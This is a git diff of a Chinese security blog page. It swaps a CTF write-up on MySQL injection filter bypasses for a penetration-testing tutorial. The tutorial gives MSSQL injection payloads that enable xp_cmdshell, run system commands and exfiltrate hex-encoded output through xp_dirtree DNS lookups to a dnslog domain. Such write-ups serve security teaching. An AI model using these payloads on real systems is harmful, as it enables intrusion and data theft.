@@ -22,7 +22,7 @@
     <meta name="description" content="信息安全技术博客">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>ctf记录-记一次有趣的注入 · c1ay&#39;s blog</title>
+    <title>渗透技巧-mssql盲注与dnslog的完美结合(命令执行) · c1ay&#39;s blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -217,7 +217,7 @@
                 <a href="/" >c1ay&#39;s blog</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">ctf记录-记一次有趣的注入</a>
+                <a href="#" class="post-name">渗透技巧-mssql盲注与dnslog的完美结合(命令执行)</a>
             </div>
     </div>
     
@@ -247,7 +247,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            ctf记录-记一次有趣的注入
+            渗透技巧-mssql盲注与dnslog的完美结合(命令执行)
             <!-- 404 -->
             
         </h1>
@@ -266,18 +266,18 @@ height:50vh;
                 
                     <div class= post-intro-tags >
     
-        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags = "渗透测试">渗透测试</a>
     
 </div>
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count word-count">707</span>Reading time: <span class="post-count reading-time">3 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">1.5k</span>阅读时长: <span class="post-count reading-time">6 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2019/11/06</span>
+                    <span class="post-intro-time">2019/01/11</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -401,50 +401,54 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <h1 id="ctf记录-记一次有趣的注入绕过"><a href="#ctf记录-记一次有趣的注入绕过" class="headerlink" title="ctf记录-记一次有趣的注入绕过"></a>ctf记录-记一次有趣的注入绕过</h1><p>正常页面：<br>xxx/article.php?id=2</p>
-<p>当<code>id=2&#39;</code>时返回404(页面不正常)，但是没有sql报错信息<br><img src="http://pic.c1imber.top/blog/20191103/3bsc8Vsv4JIk.png?imageslim" alt="mark"><br>当<code>id=2&quot;</code>时返回正常页面<br><img src="http://pic.c1imber.top/blog/20191103/pid239dEOaan.png?imageslim" alt="mark"><br>所以有可能是单引号包裹的字符型无报错回显注入</p>
-<p>当<code>id=2&#39;--</code>时– 被过滤，<code>id=2&#39;%23</code>页面正常显示,基本确定了存在注入<br><img src="http://pic.c1imber.top/blog/20191103/VQCYSJ7NGEI7.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/20191103/NBypRnQjWQ31.png?imageslim" alt="mark"></p>
-<p>该注入存在过滤，通过简单测试，发现大致过滤了order、information_schema、and、or、逗号等字符，并且对union select进行了过滤，但是union和select单独出现并没有过滤</p>
-<p>另外该注入无sql报错回显，只能使用union联合查询和盲注，由于前者在页面有回显，所以这里优先选择前者</p>
-<p>选择union注入的话，总结出需要突破的几个点：</p>
-<pre><code>1、需要突破对union select的过滤，另外order被过滤，所以不能通过order by判断列数
-2、注入不能使用逗号
-3、不能使用information_schema
-</code></pre><p>接下来，对这些限制进行突破，总之，过滤了什么，绕什么就行了~</p>
-<p>突破1：</p>
-<p>mysql当中<code>/**/</code>可以代替空格，可以使用<code>union/**/select</code>绕过对<code>union select</code>的过滤</p>
-<p>order被过滤，不能使用order by判断列数，使用以下方式判断列数</p>
-<pre><code>id=2&apos; union/**/select 1
-id=2&apos; union/**/select 1,2
-...    
-</code></pre><p>但是这里使用了逗号，被拦截<br><img src="http://pic.c1imber.top/blog/20191103/n0Ssb5lx5C6f.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/20191103/hlj42riH3JhY.png?imageslim" alt="mark"></p>
-<p>突破2：</p>
-<p>不能使用逗号，可以使用子查询绕过</p>
-<pre><code>id=112&apos; union/**/select * from (select 1)a join (select 2)b join (select 3)c join (select 4)d%23
-</code></pre><p><img src="http://pic.c1imber.top/blog/20191103/FAgbn0kGvekX.png?imageslim" alt="mark"><br>回显位在2和4，尝试检查查询一些信息，查询成功</p>
-<pre><code>id=112&apos; union/**/select * from (select 1)a join (select 2)b join (select 3)c join (select user())d%23
-</code></pre><p><img src="http://pic.c1imber.top/blog/20191103/quddeGfhqJ6i.png?imageslim" alt="mark"></p>
-<pre><code>id=112&apos; union/**/select * from (select 1)a join (select 2)b join (select 3)c join (select version())d%23
-</code></pre><p><img src="http://pic.c1imber.top/blog/20191103/vOUMiM47pRt8.png?imageslim" alt="mark"></p>
-<pre><code>id=112&apos; union/**/select * from (select 1)a join (select 2)b join (select 3)c join (select database())d%23
-</code></pre><p><img src="http://pic.c1imber.top/blog/20191103/LLR8lDCOKcbU.png?imageslim" alt="mark"><br>但是在通过<code>information_schema</code>获取表名和列名时，被拦截</p>
-<p>突破3：</p>
-<p>关于注入不能使用<code>information_schema</code>,记得之前s1ye师傅有提到过绕过的方法，那时没有怎么研究，又去请教了一番s1ye师傅，得到解答~</p>
-<p>当不能使用<code>information_schema</code>时，可以使用<code>select group_concat(distinct table_name)from mysql.innodb_index_stats</code>获取到表名，很强（看来有必要仔细阅读一下mysql的官方手册了）</p>
-<p>获取表名：<br><code>id=112&#39; union/**/select * from (select 1)a join (select 2)b join (select 3)c join (select group_concat(distinct table_name)from mysql.innodb_index_stats)d%23</code><br><img src="http://pic.c1imber.top/blog/20191103/H4AwS6Lzcqdy.png?imageslim" alt="mark"></p>
-<p>接下来就是关于无列名注入的问题了，继续使用子查询就可以解决，获取flag~</p>
-<pre><code>id=112&apos; union/**/select * from ((select 1)a join (select 2)b join (select 3)c join (select group_concat(`3`) from (select * from ((select 1)a join (select 2)b join (select 3)c) union/**/select * from fl111aa44a99g)x)d)%23
-</code></pre><p><img src="http://pic.c1imber.top/blog/20191103/mvbTH4konJGF.png?imageslim" alt="mark"></p>
-<p>拖延症真的很可怕</p>
+        <h1 id="mssql盲注与dnslog的完美结合-命令执行"><a href="#mssql盲注与dnslog的完美结合-命令执行" class="headerlink" title="mssql盲注与dnslog的完美结合(命令执行)"></a>mssql盲注与dnslog的完美结合(命令执行)</h1><h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p><strong>在一次渗透的过程中，遇到了sqlserver的注入点，在使用dnslog接收语句的执行结果时发现可以执行系统命令，但是在接收结果的时候遇到了些问题，问题如下</strong></p>
+<a id="more"></a>
+<p><strong>通过手工注入将命令执行结果发送至dnslog的语句如下：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">;<span class="keyword">CREATE</span><span class="comment">/**/</span><span class="keyword">TABLE</span><span class="comment">/**/</span>tt_tmp<span class="comment">/**/</span>(tmp1<span class="comment">/**/</span><span class="built_in">varchar</span>(<span class="number">8000</span>));<span class="comment">--</span></div><div class="line">;<span class="keyword">DECLARE</span><span class="comment">/**/</span>@code<span class="comment">/**/</span><span class="built_in">VARCHAR</span>(<span class="number">8000</span>);<span class="keyword">SET</span><span class="comment">/**/</span>@code=<span class="number">0x77686f616d69</span>;<span class="keyword">insert</span><span class="comment">/**/</span><span class="keyword">into</span><span class="comment">/**/</span>tt_tmp(tmp1)<span class="comment">/**/</span>exec<span class="comment">/**/</span>master..xp_cmdshell<span class="comment">/**/</span>@code;<span class="comment">-- </span></div><div class="line">;<span class="keyword">declare</span> @a <span class="built_in">char</span>(<span class="number">128</span>);<span class="keyword">set</span> @a=<span class="string">'\\'</span>%<span class="number">2</span>b(<span class="keyword">select</span> master.dbo.fn_varbintohexstr(<span class="keyword">cast</span>(<span class="keyword">cast</span>((<span class="keyword">select</span> top <span class="number">1</span> tmp1 <span class="keyword">from</span> tt_tmp) <span class="keyword">as</span> <span class="built_in">char</span>(<span class="number">255</span>)) <span class="keyword">as</span> VARBINARY)))%<span class="number">2</span>b<span class="string">'.meomna.ceye.io\abc'</span>;exec master..xp_dirtree @a;<span class="comment">--</span></div></pre></td></tr></table></figure>
+<p><strong>以上语句用来执行whoami，然后使用dnslog接收命令执行的结果，结果如图</strong><br><img src="http://pic.c1imber.top/blog/20190111/y4ATogsXvqnW.png" alt="mark"></p>
+<p><strong>这几条语句大致的意思是首先创建一个临时表，之后使用<code>xp_cmdshell</code>这个存储过程去执行whoami并将命令执行的结果插入到这个临时表，然后查询临时表的内容并将查询结果通过<code>xp_dirtree</code>这个存储过程发送至dnslog，这里需要对结果进行16进制编码，因为UNC路径里不允许有一些特殊字符，至于为什么要使用这种方式呢，一是因为网站有防护，直接上sqlmap的话会被封ip影响渗透，二是因为该注入点只能通过盲注，布尔盲注和时间盲注的速度我就不说了，大家都懂的，通过结果可以看到可以成功的执行whoami，但是接下来问题就出现了，我在执行ipconfig的时候出现了意料之外的结果,首先需要获取命令执行结果的长度，因为在使用dnslog注入的时候，UNC路径的长度也有限制，不能超过128个字符，超出长度的话语句就会执行失败，语句如下</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">;<span class="keyword">drop</span><span class="comment">/**/</span><span class="keyword">table</span><span class="comment">/**/</span>tt_tmp;<span class="comment">-- </span></div><div class="line">;<span class="keyword">CREATE</span><span class="comment">/**/</span><span class="keyword">TABLE</span><span class="comment">/**/</span>tt_tmp<span class="comment">/**/</span>(tmp1<span class="comment">/**/</span><span class="built_in">varchar</span>(<span class="number">8000</span>));<span class="comment">-- </span></div><div class="line">;<span class="keyword">DECLARE</span><span class="comment">/**/</span>@code<span class="comment">/**/</span><span class="built_in">VARCHAR</span>(<span class="number">8000</span>);<span class="keyword">SET</span><span class="comment">/**/</span>@code=<span class="number">0x6970636f6e666967</span>;<span class="keyword">insert</span><span class="comment">/**/</span><span class="keyword">into</span><span class="comment">/**/</span>tt_tmp(tmp1)<span class="comment">/**/</span>exec<span class="comment">/**/</span>master..xp_cmdshell<span class="comment">/**/</span>@code;<span class="comment">-- </span></div><div class="line">;<span class="keyword">declare</span> @a <span class="built_in">char</span>(<span class="number">128</span>);<span class="keyword">set</span> @a=<span class="string">'\\'</span>%<span class="number">2</span>b(<span class="keyword">select</span> <span class="keyword">cast</span>(<span class="keyword">len</span>(master.dbo.fn_varbintohexstr(<span class="keyword">cast</span>(<span class="keyword">cast</span>((<span class="keyword">select</span> top <span class="number">1</span> tmp1 <span class="keyword">from</span> tt_tmp) <span class="keyword">as</span> <span class="built_in">char</span>(<span class="number">255</span>)) <span class="keyword">as</span> VARBINARY))) <span class="keyword">as</span> <span class="built_in">char</span>(<span class="number">32</span>)))%<span class="number">2</span>b<span class="string">'.meomna.ceye.io\abc'</span>;exec master..xp_dirtree @a;<span class="comment">--</span></div></pre></td></tr></table></figure>
+<p><strong>语句的作用首先删除临时表，执行ipconfig并将命令执行的结果插入临时表，接着查询结果并进行16进制编码，并且获取长度，结果如下</strong><br><img src="http://pic.c1imber.top/blog/20190111/Q1gGLf0EFcSP.png" alt="mark"><br><strong>可以看到这里出现了一个奇怪的问题，获取到的长度仅仅为62字节，而ipconfig的输出肯定是比这个要长的，接下来把内容输出一下看看</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">;<span class="keyword">declare</span> @a <span class="built_in">char</span>(<span class="number">128</span>);<span class="keyword">set</span> @a=<span class="string">'\\'</span>%<span class="number">2</span>b(<span class="keyword">select</span> master.dbo.fn_varbintohexstr(<span class="keyword">cast</span>(<span class="keyword">cast</span>((<span class="keyword">select</span> top <span class="number">1</span> tmp1 <span class="keyword">from</span> tt_tmp) <span class="keyword">as</span> <span class="built_in">char</span>(<span class="number">255</span>)) <span class="keyword">as</span> VARBINARY)))%<span class="number">2</span>b<span class="string">'.meomna.ceye.io\abc'</span>;exec master..xp_dirtree @a;<span class="comment">--</span></div></pre></td></tr></table></figure>
+<p><img src="http://pic.c1imber.top/blog/20190111/pv73SFvb8xOF.png" alt="mark"></p>
+<p><strong>可以看到并没有报错，成功接收到了结果，但是可以看出全是空白字符，这里猜测命令的执行结果是多行的，但是这里只获取了第一行结果的长度和内容</strong></p>
+<p><strong>本地分析测试一波：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">CREATE</span><span class="comment">/**/</span><span class="keyword">TABLE</span><span class="comment">/**/</span>tt_tmp<span class="comment">/**/</span>(tmp1<span class="comment">/**/</span><span class="built_in">varchar</span>(<span class="number">8000</span>));<span class="comment">-- </span></div><div class="line"><span class="keyword">DECLARE</span><span class="comment">/**/</span>@code<span class="comment">/**/</span><span class="built_in">VARCHAR</span>(<span class="number">8000</span>);<span class="keyword">SET</span><span class="comment">/**/</span>@code=<span class="number">0x77686f616d69</span>;<span class="keyword">insert</span><span class="comment">/**/</span><span class="keyword">into</span><span class="comment">/**/</span>tt_tmp(tmp1)<span class="comment">/**/</span>exec<span class="comment">/**/</span>master..xp_cmdshell<span class="comment">/**/</span>@code;</div></pre></td></tr></table></figure>
+<p><img src="http://pic.c1imber.top/blog/20190111/IKImOlhIrW2m.png" alt="mark"><br><strong>报错说禁止访问xp_cmdshell,开启一下</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">EXEC sp_configure '<span class="keyword">show</span> <span class="keyword">advanced</span> options<span class="string">',1;RECONFIGURE;EXEC sp_configure '</span>xp_cmdshell<span class="string">',1;RECONFIGURE;</span></div></pre></td></tr></table></figure>
+<p><img src="http://pic.c1imber.top/blog/20190111/C5kidFPi7UAT.png" alt="mark"><br><strong>现在可以了</strong><br><img src="http://pic.c1imber.top/blog/20190111/RrJ8rlemlQKn.png" alt="mark"><br><strong>重新插入，执行ipconfig</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">CREATE</span><span class="comment">/**/</span><span class="keyword">TABLE</span><span class="comment">/**/</span>tt_tmp<span class="comment">/**/</span>(tmp1<span class="comment">/**/</span><span class="built_in">varchar</span>(<span class="number">8000</span>));<span class="comment">-- </span></div><div class="line"><span class="keyword">DECLARE</span><span class="comment">/**/</span>@code<span class="comment">/**/</span><span class="built_in">VARCHAR</span>(<span class="number">8000</span>);<span class="keyword">SET</span><span class="comment">/**/</span>@code=<span class="number">0x6970636f6e666967</span>;<span class="keyword">insert</span><span class="comment">/**/</span><span class="keyword">into</span><span class="comment">/**/</span>tt_tmp(tmp1)<span class="comment">/**/</span>exec<span class="comment">/**/</span>master..xp_cmdshell<span class="comment">/**/</span>@code;</div></pre></td></tr></table></figure>
+<p><img src="http://pic.c1imber.top/blog/20190111/h9VBVHwqDAsU.png" alt="mark"><br><strong>通过结果可以看到确实是这样子没错，在将命令的执行结果插入表中的时候遇到了换行符，所以将执行结果插入到了多行内,第一行为空字符</strong><br><img src="http://pic.c1imber.top/blog/20190111/96glQf7Y0h9L.png" alt="mark"></p>
+<p><strong>解决办法：</strong></p>
+<p><strong>创建表的时候增加主键，之后逐行查询，修改后的语句如下</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> tt_tmp (<span class="keyword">id</span> <span class="built_in">INT</span> PRIMARY <span class="keyword">KEY</span> <span class="keyword">IDENTITY</span>,tmp1 <span class="keyword">nvarchar</span>(<span class="number">4000</span>));</div><div class="line"><span class="keyword">DECLARE</span> @code <span class="built_in">varchar</span>(<span class="number">4000</span>);<span class="keyword">SET</span> @code=<span class="number">0x6970636f6e666967</span>;<span class="keyword">insert</span> <span class="keyword">into</span> tt_tmp(tmp1) exec master..xp_cmdshell @code;</div><div class="line"><span class="keyword">select</span> master.dbo.fn_varbintohexstr(<span class="keyword">cast</span>(<span class="keyword">cast</span>((<span class="keyword">select</span> tmp1 <span class="keyword">from</span> tt_tmp <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">8</span>) <span class="keyword">as</span> <span class="built_in">char</span>(<span class="number">255</span>)) <span class="keyword">as</span> VARBINARY));</div></pre></td></tr></table></figure>
+<p><strong>再次查询一下经过16进制编码后的长度，发现长度依旧被截断到了 62字节,wtf!?</strong><br><img src="http://pic.c1imber.top/blog/20190111/JwNvgKzhUdrq.png" alt="mark"><br><strong>但是直接查询内容的话并没有发现内容被截断</strong><br><img src="http://pic.c1imber.top/blog/20190111/Q5R2SXMtXd2X.png" alt="mark"><br><strong>说明截断发生在了16进制转换的过程中，分析了一波发现原来是由于转化为二进制的时候没有给VARBINARY设置长度，所以转化成二进制的时候使用的是默认长度而导致后面的内容被截断了，修改一下语句</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> master.dbo.fn_varbintohexstr(<span class="keyword">cast</span>(<span class="keyword">cast</span>((<span class="keyword">select</span> tmp1 <span class="keyword">from</span> tt_tmp <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">8</span>) <span class="keyword">as</span> <span class="built_in">char</span>(<span class="number">255</span>)) <span class="keyword">as</span> VARBINARY(<span class="number">4000</span>)));</div></pre></td></tr></table></figure>
+<p><strong>没有再发生截断问题</strong><br><img src="http://pic.c1imber.top/blog/20190111/k8jMVa6v8aS4.png" alt="mark"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="keyword">cast</span>(<span class="keyword">len</span>(master.dbo.fn_varbintohexstr(<span class="keyword">cast</span>(<span class="keyword">cast</span>((<span class="keyword">select</span> tmp1 <span class="keyword">from</span> tt_tmp <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">8</span>) <span class="keyword">as</span> <span class="built_in">char</span>(<span class="number">255</span>)) <span class="keyword">as</span> VARBINARY(<span class="number">4000</span>)))) <span class="keyword">as</span> <span class="built_in">char</span>(<span class="number">32</span>));</div></pre></td></tr></table></figure>
+<p><strong>发现长度为512字节，后面多出的会由空格x20填充</strong></p>
+<p><strong>之后通过一系列折腾，总结使用dnslog接收sqlserver执行命令结果的方法</strong></p>
+<p><strong>第一步：创建临时表用于接收命令的执行结果，需要定义主键：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> tt_tmp (<span class="keyword">id</span> <span class="built_in">INT</span> PRIMARY <span class="keyword">KEY</span> <span class="keyword">IDENTITY</span>,tmp1 <span class="keyword">nvarchar</span>(<span class="number">4000</span>));</div></pre></td></tr></table></figure>
+<p><strong>第二步：将命令执行结果插入临时表：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">DECLARE</span> @code <span class="built_in">varchar</span>(<span class="number">4000</span>);<span class="keyword">SET</span> @code=<span class="number">0x77686f616d69</span>;<span class="keyword">insert</span> <span class="keyword">into</span> tt_tmp(tmp1) exec master..xp_cmdshell @code;</div></pre></td></tr></table></figure>
+<p><strong>第三步：由于插入了多行，首先需要获取行数(经过测试部分版本的sqlserver在UNC查询结果的位置不能有空格，需要去除空格，使用rtrim)：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">declare</span> @a <span class="built_in">char</span>(<span class="number">128</span>);<span class="keyword">set</span> @a=<span class="string">'\\'</span>+(<span class="keyword">select</span> <span class="keyword">rtrim</span>(<span class="keyword">cast</span>(<span class="keyword">COUNT</span>(*) <span class="keyword">as</span> <span class="built_in">char</span>(<span class="number">32</span>))) <span class="keyword">from</span> tt_tmp)+<span class="string">'.meomna.ceye.io\abc'</span>;exec master..xp_dirtree @a;</div></pre></td></tr></table></figure>
+<p><strong>第四步：将查询结果发送至dnslog(逐行读取，截取字符串)</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">declare</span> @a <span class="built_in">char</span>(<span class="number">128</span>);<span class="keyword">set</span> @a=<span class="string">'\\'</span>%<span class="number">2</span>b(<span class="keyword">select</span> <span class="keyword">substring</span>(master.dbo.fn_varbintohexstr(<span class="keyword">cast</span>(<span class="keyword">cast</span>((<span class="keyword">select</span> tmp1 <span class="keyword">from</span> tt_tmp <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>) <span class="keyword">as</span> <span class="built_in">char</span>(<span class="number">255</span>)) <span class="keyword">as</span> VARBINARY(<span class="number">4000</span>))),<span class="number">1</span>,<span class="number">60</span>))%<span class="number">2</span>b<span class="string">'.meomna.ceye.io\abc'</span>;exec master..xp_dirtree @a;</div></pre></td></tr></table></figure>
+<p><strong>每次截取60个字符，直到截取完512个字符为止</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">declare</span> @a <span class="built_in">char</span>(<span class="number">128</span>);<span class="keyword">set</span> @a=<span class="string">'\\'</span>%<span class="number">2</span>b(<span class="keyword">select</span> <span class="keyword">substring</span>(master.dbo.fn_varbintohexstr(<span class="keyword">cast</span>(<span class="keyword">cast</span>((<span class="keyword">select</span> tmp1 <span class="keyword">from</span> tt_tmp <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>) <span class="keyword">as</span> <span class="built_in">char</span>(<span class="number">255</span>)) <span class="keyword">as</span> VARBINARY(<span class="number">4000</span>))),<span class="number">61</span>,<span class="number">60</span>))%<span class="number">2</span>b<span class="string">'.meomna.ceye.io\abc'</span>;exec master..xp_dirtree @a;</div><div class="line">...</div><div class="line">...</div><div class="line">总共截取9次，可以写脚本完成</div><div class="line"></div><div class="line">1-60</div><div class="line">61-120</div><div class="line">121-180</div><div class="line">181-240</div><div class="line">241-300</div><div class="line">301-360</div><div class="line">361-420</div><div class="line">421-480</div><div class="line">481-512</div></pre></td></tr></table></figure>
+<p><strong>第五步：删除临时表，用于接收下一次命令执行的结果</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">drop</span><span class="comment">/**/</span><span class="keyword">table</span><span class="comment">/**/</span>tt_tmp;<span class="comment">--</span></div></pre></td></tr></table></figure>
 
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
-            <p>Author：<a href="https://c1aysec.github.io">c1ay</a>
-            <p>原文链接：<a href="https://c1aysec.github.io/2019/11/06/ctf记录-记一次有趣的注入/">https://c1aysec.github.io/2019/11/06/ctf记录-记一次有趣的注入/</a>
-            <p>发表日期：<a href="https://c1aysec.github.io/2019/11/06/ctf记录-记一次有趣的注入/">November 6th 2019, 11:33:06 pm</a>
-            <p>更新日期：<a href="https://c1aysec.github.io/2019/11/06/ctf记录-记一次有趣的注入/">November 3rd 2019, 10:29:34 am</a>
+            <p>原文作者：<a href="https://c1aysec.github.io">c1ay</a>
+            <p>原文链接：<a href="https://c1aysec.github.io/2019/01/11/mssql盲注与dnslog的完美结合(命令执行)/">https://c1aysec.github.io/2019/01/11/mssql盲注与dnslog的完美结合(命令执行)/</a>
+            <p>发表日期：<a href="https://c1aysec.github.io/2019/01/11/mssql盲注与dnslog的完美结合(命令执行)/">January 11th 2019, 4:08:50 pm</a>
+            <p>更新日期：<a href="https://c1aysec.github.io/2019/01/11/mssql盲注与dnslog的完美结合(命令执行)/">November 7th 2019, 1:05:58 am</a>
             <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -453,7 +457,7 @@ id=2&apos; union/**/select 1,2
         <li class="next">
             
                 <div class="nextSlogan">Next Post</div>
-                <a href= "/2019/11/06/DDCTF2019 write up/" title= "DDCTF2019 write up">
+                <a href= "/2019/04/18/DDCTF2019 write up/" title= "DDCTF2019 write up">
                     <div class="nextTitle">DDCTF2019 write up</div>
                 </a>
             
@@ -461,8 +465,8 @@ id=2&apos; union/**/select 1,2
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href= "/2019/11/06/2019极客巅峰ctf记录/" title= "2019极客巅峰ctf记录">
-                    <div class="prevTitle">2019极客巅峰ctf记录</div>
+                <a href= "/2018/12/21/phpcms2008 type.php代码执行漏洞/" title= "phpcms2008 type.php代码执行漏洞分析与复现">
+                    <div class="prevTitle">phpcms2008 type.php代码执行漏洞分析与复现</div>
                 </a>
             
         </li>
@@ -577,7 +581,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ctf记录-记一次有趣的注入绕过"><span class="toc-number">1.</span> <span class="toc-text">ctf记录-记一次有趣的注入绕过</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#mssql盲注与dnslog的完美结合-命令执行"><span class="toc-number">1.</span> <span class="toc-text">mssql盲注与dnslog的完美结合(命令执行)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#序"><span class="toc-number">1.0.1.</span> <span class="toc-text">序</span></a></li></ol></li></ol></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -590,48 +594,6 @@ top:50vh;
     <div class="sidebar-content sidebar-content-show-archive">
           <div class="sidebar-panel-archives">
     <!-- 在ejs中将archive按照时间排序 -->
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
     
     
     
@@ -1438,32 +1400,22 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/06</span><a class="archive-post-title" href= "/2019/11/06/phpcms2008 type.php代码执行漏洞/" >phpcms2008 type.php代码执行漏洞分析与复现</a>
+            <span class="archive-post-date">11/03</span><a class="archive-post-title" href= "/2019/11/03/ctf记录-记一次有趣的注入/" >ctf记录-记一次有趣的注入</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/06</span><a class="archive-post-title" href= "/2019/11/06/mssql盲注与dnslog的完美结合(命令执行)/" >渗透技巧-mssql盲注与dnslog的完美结合(命令执行)</a>
+            <span class="archive-post-date">10/20</span><a class="archive-post-title" href= "/2019/10/20/2019极客巅峰ctf记录/" >2019极客巅峰ctf记录</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/06</span><a class="archive-post-title" href= "/2019/11/06/DDCTF2019 write up/" >DDCTF2019 write up</a>
+            <span class="archive-post-date">04/18</span><a class="archive-post-title" href= "/2019/04/18/DDCTF2019 write up/" >DDCTF2019 write up</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/06</span><a class="archive-post-title" href= "/2019/11/06/ctf记录-记一次有趣的注入/" >ctf记录-记一次有趣的注入</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">11/06</span><a class="archive-post-title" href= "/2019/11/06/2019极客巅峰ctf记录/" >2019极客巅峰ctf记录</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">05/28</span><a class="archive-post-title" href= "/2019/05/28/2019强网杯-过滤select的注入/" >2019强网杯-过滤select的注入</a>
+            <span class="archive-post-date">01/11</span><a class="archive-post-title" href= "/2019/01/11/mssql盲注与dnslog的完美结合(命令执行)/" >渗透技巧-mssql盲注与dnslog的完美结合(命令执行)</a>
         </li>
     
     
@@ -1474,6 +1426,11 @@ top:50vh;
     
     <div class="archive-year"> 2018 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/21</span><a class="archive-post-title" href= "/2018/12/21/phpcms2008 type.php代码执行漏洞/" >phpcms2008 type.php代码执行漏洞分析与复现</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -1718,6 +1675,29 @@ top:50vh;
         <li class="archive-post-item">
             <span class="archive-post-date">11/05</span><a class="archive-post-title" href= "/2017/11/05/Some Words/" >第三届上海市大学生网络安全大赛注入题writeup</a>
         </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/11/06/2019强网杯-过滤select的注入/" >2019强网杯-过滤select的注入</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2017 </div>
+    <ul class="year-list">
     
     
         <li class="archive-post-item">
